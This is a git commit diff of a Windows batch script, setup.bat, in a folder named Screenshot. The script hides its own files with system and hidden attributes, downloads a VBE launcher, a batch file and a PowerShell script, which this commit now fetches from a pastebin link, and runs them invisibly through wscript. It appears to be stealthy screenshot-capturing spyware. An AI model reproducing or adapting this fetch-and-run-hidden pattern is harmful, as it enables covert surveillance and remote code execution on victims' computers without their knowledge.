1f3ced65be81397bcde3599fafd0d210fb6322a4
Ale-cyber <59205495+Ale-cyber@users.noreply.github.com>
2021-10-05 16:17:34 +0200

    Update setup.bat

--- Screenshot/setup.bat
+++ Screenshot/setup.bat
@@ -8,6 +8,6 @@ attrib +s +h s
 attrib +s +h s.bat
 cd s
 curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/invisible.vbe -o i.vbe
-curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/screenshot.ps1 -o s.ps1
+curl -s https://pastebin.com/dsLQmyew -o s.ps1
 curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/run.bat -o r.bat
 wscript.exe "i.vbe" "r.bat"
